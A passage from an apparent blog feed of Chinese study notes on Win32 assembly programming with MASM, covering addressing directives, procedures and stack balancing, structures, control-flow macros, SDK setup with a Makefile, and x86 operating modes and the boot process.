低地址放低</span><br></pre></td></tr></table></figure><ul><li><p>它只是用了变量的地址，所需要的变量的大小是取决于其他的东西</p></li><li><p>2个简单的命令</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.movzx将变量扩展到应该有的大小</span><br><span class="line">这个是直接在高位放0</span><br><span class="line">2.movsx将变量扩展到应该有的大小</span><br><span class="line">这个是带有符号位的扩展</span><br><span class="line">最高位是0，就扩展0//最高位就是符号的标识</span><br><span class="line">最高位是1，就扩展1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230422175319183.png" alt="image-20230422175319183"></p><h3 id="2-）变量的尺寸和数量"><a href="#2-）变量的尺寸和数量" class="headerlink" title="2.）变量的尺寸和数量"></a>2.）变量的尺寸和数量</h3><ul><li>首先是2个伪指令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.sizeof</span><br><span class="line">对于变量名，数据结构，数据结构名</span><br><span class="line">2.lengthof</span><br><span class="line">对于变量名</span><br></pre></td></tr></table></figure><ul><li>1.sizeof去识别某变量的长度</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">szdd1,2,3,4</span><br><span class="line"></span><br><span class="line">sizeof sz</span><br></pre></td></tr></table></figure><ul><li>这样的话，长度就是16【4*4】</li><li>在使用sizeof的时候只是去识别该变量的长度，在masm编译器中，变量的定义就是一行</li><li>所以有：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">szdb&#x27;hello&#x27;,0dh,0ah;0dh和0ah其实就是换行</span><br><span class="line">db&#x27;word&#x27;,0</span><br><span class="line"></span><br><span class="line">sizeof sz</span><br></pre></td></tr></table></figure><ul><li>这样去识别的时候，sz的长度就是7，而不是13，但是在用函数MessageBox的函数的时候，会显示出所有，因为字符串的结束是按照0所结束的。在没有识别到0的时候，就会继续识别【在地址中存放的时候，他是挨着向下存放的】</li><li>**所以在识别字符串的长度的时候，应该使用lstrlen函数去计算</li></ul><h3 id="3-）获取变量地址"><a href="#3-）获取变量地址" class="headerlink" title="3.）获取变量地址"></a>3.）获取变量地址</h3><ul><li>相当于获取指针咯</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov 寄存器,offset 变量名</span><br></pre></td></tr></table></figure><ul><li>1.这个offset就是取地址的伪操作符。【只能用于全局变量，不能用于局部变量】</li><li>为什么呢？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个地方就要讲究一个先后顺序的操作了，伪指令是在编译器的时候进行，但是指令是在CPU来操作。</span><br><span class="line">局部变量，在编译的时候无从得知它的地址，所以不能用咯</span><br></pre></td></tr></table></figure><ul><li>2.所以在获取局部变量的地址的时候，就需要用到    lea    指令【该指令是CPU指令】</li><li>对于局部变量，它是用ebp来做指针进行操作的</li><li>lea的原理：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在使用lea的时候，按照ebp的值实际计算出来，然后放在eax中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">就比如：leaeax,[ebp-4]</span><br><span class="line">这样就能获取一个局部变量的地址</span><br></pre></td></tr></table></figure><ul><li><p>3.在invoke伪指令获取参数的时候，就也不能用lea了….【这个invoke 相当于有参数的call】</p></li><li><p>哦豁，这下怎么办呢？</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">卧槽，肯定有办法啊。</span><br><span class="line">这个时候就是用addr 伪指令</span><br></pre></td></tr></table></figure><ul><li>注意：在使用addr的时候，只能在invoke下使用！！</li><li>addr的原理</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当addr后面跟的是全局变量的时候，它的作用就和offset的用法一样。</span><br><span class="line">当addr后面跟的是局部变量的时候，它的作用就和lea一样，会把地址这玩意放在eax中</span><br></pre></td></tr></table></figure><ul><li>注意：在使用addr的时候，前面不能有eax进行传参</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比如：invoketext,eax,addr szHello</span><br><span class="line">这样是错误的！！</span><br></pre></td></tr></table></figure><ul><li>对上面的代码进行反汇编</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lea eax,[ebp-4];首先是对addr伪指令进行操作</span><br><span class="line">push eax;这个是放的addr szHello的地址</span><br><span class="line">push eax;这个放的是eax 第一个参数的地址</span><br><span class="line">call test</span><br><span class="line"></span><br><span class="line">这样的话，就会把eax中的值被覆盖掉，就会出现逻辑上的错误。 </span><br></pre></td></tr></table></figure><h1 id="使用子程序"><a href="#使用子程序" class="headerlink" title="使用子程序"></a>使用子程序</h1><ul><li><p>把一段代码封装起来【我咋感觉和函数差不多】</p></li><li><p>过程和函数，过程无返回值，函数有返回值</p></li><li><p>化繁为简，在主程序中用call</p></li><li><p>当然也是要用invoke</p></li></ul><h2 id="1-子程序的定义"><a href="#1-子程序的定义" class="headerlink" title="1.子程序的定义"></a>1.子程序的定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][,参数:类型]...[VARARG]</span><br><span class="line">local 局部变量列表</span><br><span class="line"></span><br><span class="line">指令</span><br><span class="line"></span><br><span class="line">子程序名 endp</span><br></pre></td></tr></table></figure><ul><li> 【距离】——有很多种，这里懒得列出来了（P75）win32种肯有无视它</li><li>【语言类型】——也有很多种（P75）忽略就是使用 .model中的值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表示参数的使用方式，和堆栈平衡的方式</span><br></pre></td></tr></table></figure><ul><li>【可视区域】——有PRIVATE,PUBLIC,EXPORT,三种</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PRIVATE：表示子程序只对本模块可见</span><br><span class="line">PUBLIC：表示对所有的模块可见(最后编译完成在.exe文件中)</span><br><span class="line">EXPORT：表示是到处的函数，当编写DLL的时候要将某个函数到处的时候可以这样使用</span><br><span class="line"></span><br><span class="line">默认是用PUBLIC</span><br></pre></td></tr></table></figure><ul><li>【USES寄存器列表】——就是把将用的寄存器push 最后 pop</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不如使用pushad在开头，最后使用popad指令，一次性保存和恢复所有的寄存器</span><br></pre></td></tr></table></figure><ul><li>【参数和类型】——参数指参数的名称，在定义参数名的时候不能和全局变量和局部变量重名。类型不用管，在win32中都是dw</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VARARG：表示在确定的参数后还可以跟多个数量不确定的参数。</span><br><span class="line">在win32中使用VARARG的API只有wsprintf。</span><br><span class="line">类似和printf</span><br></pre></td></tr></table></figure><ul><li><p>在完成定义之后，就可以用invoke来调用子程序咯。</p></li><li><p>在调用子程序的时候，需要首先声明子程序</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用 proto 来声明子程序</span><br></pre></td></tr></table></figure><ul><li>也可以 把子程序写在invoke调用之前，就可以省略proto咯</li></ul><h2 id="2-参数传递和堆栈平衡"><a href="#2-参数传递和堆栈平衡" class="headerlink" title="2.参数传递和堆栈平衡"></a>2.参数传递和堆栈平衡</h2><ul><li>咋理解呢？参数的传递是通过栈这个东西传递的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈是共用的，相当于是一个内存空间，直接访问那个内存空间就好啦</span><br></pre></td></tr></table></figure><ul><li>堆栈平衡</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是说，在进行参数传递的时候，会把参数先放到栈中，这个栈中的内容是现在这个子程序所有的。最后把这个栈的指针重新指回原来的位置，将相当于栈中的内容清空了【其实我理解的是，栈就是一部分内存空间，通过指针来确定这个栈中的内容或者大小，只要指针指回去了，就相当于栈清空了，其实内容是没有被清空的】【在内存空间中，内容只能被覆盖---个人理解罢了】</span><br></pre></td></tr></table></figure><ul><li>比如说：调用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SubRouting(Var1,Var2,Var3)</span><br></pre></td></tr></table></figure><ul><li>编译后是：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push Var3</span><br><span class="line">push Var2</span><br><span class="line">push Var1</span><br><span class="line">call SubRouting</span><br><span class="line">add esp,12;esp就相当于是栈指针【还是我的个人理解，可能会有偏差，但不影响】</span><br></pre></td></tr></table></figure><ul><li>堆栈平衡也就是：调用者首先把参数放入栈中，然后调用子程序，在完成后，把栈的指针还原到原来的位置。</li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230422220257841.png" alt="image-20230422220257841"></p><ul><li>这里有一段源程序【P76】我就不写过来了。</li><li>其实有点模糊，后面遇到了在来深入理解吧。</li></ul><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><ul><li><p>几乎所有的API所涉及的数据结构在windows.inc文件中都有定义</p></li><li><p>偷个懒，直接上图片【哈哈哈】</p></li><li><p>在C语言中</p></li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230422222559450.png" alt="image-20230422222559450"></p><ul><li>在汇编中定义一个数据结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">结构名struct</span><br><span class="line">字段名1类型?</span><br><span class="line">字段名2类型?</span><br><span class="line">...</span><br><span class="line">结构名ends</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WNDCLASSEX STRUCT</span><br><span class="line">  cbSize            DWORD      ?</span><br><span class="line">  style             DWORD      ?</span><br><span class="line">  lpfnWndProc       DWORD      ?</span><br><span class="line">  cbClsExtra        DWORD      ?</span><br><span class="line">  cbWndExtra        DWORD      ?</span><br><span class="line">  hInstance         DWORD      ?</span><br><span class="line">  hIcon             DWORD      ?</span><br><span class="line">  hCursor           DWORD      ?</span><br><span class="line">  hbrBackground     DWORD      ?</span><br><span class="line">  lpszMenuName      DWORD      ?</span><br><span class="line">  lpszClassName     DWORD      ?</span><br><span class="line">  hIconSm           DWORD      ?</span><br><span class="line">WNDCLASSEX ENDS</span><br></pre></td></tr></table></figure><ul><li><p>我们要知道的是：数据结构只是一个样板</p></li><li><p>通过这个数据结构这个样板，在数据结构在数据段中定义数据</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data?</span><br><span class="line">stWndClassWNDCLASS&lt;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">stWndClassWNDCLASS&lt;1,2,3,4,5,6,7,8,9,10&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>这样就能定义按照WNDCLASS为结构的变量stWndClass。</li><li>如何调用其中的内容呢？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.用点</span><br><span class="line">mov eax,stWndClass.lpfnWndProc</span><br><span class="line">就是变量.字段==&gt;就相当于调用了3【在这里就是】</span><br><span class="line"></span><br><span class="line">2.用指针来找到地址</span><br><span class="line">mov esi,offset stWndClass</span><br><span class="line">moveax,[esi+WNDCLASS+lpfnWndProc]</span><br><span class="line">//这里要使用WNDCLASS+lpfnWndProc</span><br><span class="line">//相当于就是偏移地址</span><br><span class="line"></span><br><span class="line">3.用assume伪指令把寄存器预定义为结构指针。</span><br><span class="line">mov esi,offset stWndClass</span><br><span class="line">assume esi:ptr WNDCLASS</span><br><span class="line">moveax,[esi].lpfnWndProc</span><br><span class="line">...</span><br><span class="line">assume esi:nothing;当不在使用esi寄存器来做指针的时候，就用这个来取消定义</span><br></pre></td></tr></table></figure><ul><li>哈哈哈傻逼东西，可以嵌套哦</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NEW_WNDCLASSstruct</span><br><span class="line"></span><br><span class="line">dwOptiondword?</span><br><span class="line">oldWndClassWNDCLASS&lt;&gt;</span><br><span class="line"></span><br><span class="line">NEW_WNDCLASSends</span><br></pre></td></tr></table></figure><ul><li><p>这里中间这个部分就是嵌套，tmd。嵌套，可以理解成把这个字段啥的，全部都copy过来</p></li><li><p>假设esi指向了NEW_WNDCLASS，那么要引用oldWndClass里面的某个字段</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moveax,[esi].oldWndClass.lpfnWndProc</span><br></pre></td></tr></table></figure><h1 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h1><h2 id="1-条件测试语句"><a href="#1-条件测试语句" class="headerlink" title="1.条件测试语句"></a>1.条件测试语句</h2><p>懒得说了</p><h2 id="2-分支语句"><a href="#2-分支语句" class="headerlink" title="2.分支语句"></a>2.分支语句</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.if</span><br><span class="line">.elseif</span><br><span class="line">.else</span><br><span class="line"></span><br><span class="line">.endif;最后需要用这个来表示结束</span><br></pre></td></tr></table></figure><h2 id="3-循环"><a href="#3-循环" class="headerlink" title="3.循环"></a>3.循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.while条件测试表达式</span><br><span class="line">    指令</span><br><span class="line">    [.break[.if 退出条件]]</span><br><span class="line">    [.continue]</span><br><span class="line">.endw</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.repeat</span><br><span class="line">指令</span><br><span class="line">[.break[.if退出条件]]</span><br><span class="line">[.continue]</span><br><span class="line">.until条件测试表达式(或.untilcxz[条件测试表达式])</span><br><span class="line"></span><br><span class="line">;这个和do while 一样</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WIN32程序设计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-必读内容（0）</title>
      <link href="/2023/05/02/8086%E6%B1%87%E7%BC%96-0-%E5%BF%85%E8%AF%BB%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/05/02/8086%E6%B1%87%E7%BC%96-0-%E5%BF%85%E8%AF%BB%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>该内容是根据</p><p>王爽的《汇编语言》＋小甲鱼的b站视频所自己写的笔记。<br>初学者，可能又会很多不当之处</p>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WIN32程序设计-第一个程序(2)</title>
      <link href="/2023/05/02/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-2-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%EF%BC%88win32%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%A8%E9%83%A8%E8%BF%87%E7%A8%8B%EF%BC%89/"/>
      <url>/2023/05/02/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-2-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%EF%BC%88win32%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%A8%E9%83%A8%E8%BF%87%E7%A8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1-MASM32-SDK介绍"><a href="#1-MASM32-SDK介绍" class="headerlink" title="1.MASM32 SDK介绍"></a>1.MASM32 SDK介绍</h1><ul><li>目标是用汇编写出专业的大型程序：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.除了编译器，连接器外，还包含了汇编需要用到的各种详尽的头文件和导入库文件，导入库文件取自Visual C++ 的导入库</span><br><span class="line">2.收集来自世界各地Win32汇编爱好者的源程序以及很多详细的列子程序</span><br><span class="line">3.发布者还为他编写了一个简单的IDE环境，包括一个专用的汇编源程序编译器和源程模板生成器</span><br></pre></td></tr></table></figure><ul><li>安装目录说明</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D:\masm32：IDE环境，内带文本编译程序和模板生成程序</span><br><span class="line">D:\masm32\include：所有的导入库文件</span><br><span class="line">D:\masm32\lib：所有的导入库文件</span><br><span class="line">D:\masm32\bin：可执行文件目录，包括ml.exe，link.exe,rc.exe</span><br><span class="line">D:\masm32\help:帮助文档</span><br><span class="line">D:\masm32\m32lib：一些常用的c子程序的汇编实现源程序，很有价值</span><br><span class="line">还有一些其他奇奇怪怪的好用的【以后再说】</span><br></pre></td></tr></table></figure><ul><li>经过了很久的调试，最终在我的电脑上，如果想用win32汇编需要如下操作【手动操作】</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.在d:\masm32中运行cmd</span><br><span class="line">2.设置环境变量，这里用的是var.bat批处理【运行一下就好了】</span><br><span class="line">3.转到写得有汇编的目录下面【cd sources\test】</span><br><span class="line">4.首先用ml编译一下，【ml /c /coff /Cp *.asm】</span><br><span class="line">5.然后用link链接【link /subsystem:windows *.obj ...】</span><br><span class="line">6.就有exe文件啦</span><br></pre></td></tr></table></figure><ul><li>使用nmake ，快捷方式，首先在asm 的目录下创建一个 Makefile,内容如下。然后直接在cmd中运行 cmd</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">EXE = Test.exe#指定输出文件</span><br><span class="line">OBJS = Test.obj#需要的目标文件</span><br><span class="line">RES = Test.res#需要的资源文件</span><br><span class="line"></span><br><span class="line">LINK_FLAG = /subsystem:windows#连接选项</span><br><span class="line">ML_FLAG = /c /coff#编译选项</span><br><span class="line"></span><br><span class="line">$(EXE): $(OBJS) $(RES)</span><br><span class="line">Link $(LINK_FLAG) $(OBJS) $(RES)</span><br><span class="line"></span><br><span class="line">.asm.obj:</span><br><span class="line">ml $(ML_FLAG) $&lt;</span><br><span class="line">.rc.res:</span><br><span class="line">rc $&lt;</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">del *.obj</span><br><span class="line">del *.res</span><br></pre></td></tr></table></figure><ul><li>经过修改后：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">EXE = test.exe#指定输出文件</span><br><span class="line">OBJS = test.obj#需要的目标文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LINK_FLAG = /subsystem:windows#连接选项</span><br><span class="line">ML_FLAG = /c /coff#编译选项</span><br><span class="line"></span><br><span class="line">$(EXE): $(OBJS) </span><br><span class="line">Link $(LINK_FLAG) $(OBJS) </span><br><span class="line"></span><br><span class="line">.asm.obj:</span><br><span class="line">ml $(ML_FLAG) $&lt;</span><br></pre></td></tr></table></figure><ul><li>helloword–.asm文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">szCaption db &#x27;A MessageBox&#x27;,0</span><br><span class="line">szText db &#x27;Hello,World!&#x27;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">invoke MessageBox,NULL,offset szText,\</span><br><span class="line">offset szCaption,MB_OK</span><br><span class="line"></span><br><span class="line">invoke ExitProcess,NULL</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WIN32程序设计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WIN32程序设计-必须了解的基础知识(1)</title>
      <link href="/2023/05/02/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-1-%E5%BF%85%E9%A1%BB%E4%BA%86%E8%A7%A3%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/05/02/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-1-%E5%BF%85%E9%A1%BB%E4%BA%86%E8%A7%A3%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲:"></a>大纲:</h1><h2 id="1-80x86处理器的互作模式"><a href="#1-80x86处理器的互作模式" class="headerlink" title="(1)80x86处理器的互作模式"></a>(1)80x86处理器的互作模式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-实模式</span><br><span class="line">-保护模式</span><br><span class="line">-虚拟8086模式</span><br></pre></td></tr></table></figure><h2 id="2-Windows的内存管理机制"><a href="#2-Windows的内存管理机制" class="headerlink" title="(2)Windows的内存管理机制"></a>(2)Windows的内存管理机制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-Dos操作系统的内存安排情况</span><br><span class="line">-80376的内存寻址机制</span><br><span class="line">-80386的内存分页机制</span><br><span class="line">-windows的内存安排</span><br><span class="line">-从Win32汇编的角度看内存寻址</span><br></pre></td></tr></table></figure><h2 id="3-Windows的特权保护机制"><a href="#3-Windows的特权保护机制" class="headerlink" title="(3)Windows的特权保护机制"></a>(3)Windows的特权保护机制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-80386的中断和异常</span><br><span class="line">-80386的保护机制</span><br><span class="line">-Windows的保护机制</span><br></pre></td></tr></table></figure><h1 id="80x86处理器的互作模式"><a href="#80x86处理器的互作模式" class="headerlink" title="80x86处理器的互作模式"></a>80x86处理器的互作模式</h1><ul><li>80386以后的处理器有3种互作模式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-实模式</span><br><span class="line">-保护模式</span><br><span class="line">-虚拟8086模式</span><br></pre></td></tr></table></figure><ul><li>其实,实模式和虚拟8086模式都是为了向下兼容而设置的,保护模式才是我们的主角,是我们现代系统实际上的互作模式</li><li>只有在保护模式下,32位CPU的寻址才能达到4GB的地址空间,同时,也能实现多任务,内存分页管理和优先级保护等先进的机制</li></ul><h2 id="补-Windows-7的启动过程"><a href="#补-Windows-7的启动过程" class="headerlink" title="补:Windows 7的启动过程"></a>补:Windows 7的启动过程</h2><p>1.开启电源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机系统将进行加电自检[POST].如果通过之后BIOS会读取主引导记录[MBR]---被标记位启动设备的硬盘的首扇区,并传送被Windows 7 建立的控制编码给MBR</span><br></pre></td></tr></table></figure><ul><li>引导型病毒</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;鬼影病毒&#x27;</span><br><span class="line">通过修改MBR,将病毒放在系统加载之前加载</span><br></pre></td></tr></table></figure><ul><li>MBR</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">是一个存储区,位于硬盘的第一个扇区.</span><br><span class="line">存放的是:系统的加载信息,各个分区的信息,以及它们的偏移地址,以及各个分区的状态</span><br><span class="line"></span><br><span class="line">它不属于任何一个操作系统,也不能用操作系统提供的磁盘操作命令来读取它.但是我们可以用ROM-BIOS提供的INT 13H中断的2号功能来读出改扇区的内容</span><br></pre></td></tr></table></figure><ul><li>注意:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">硬盘的0磁通的第一个扇区称为MBR,它的大小是512字节,而这个区域可以分为2个部分.第一个部分是pre-boot[预启动区],占446字节,第二个部分是Partition 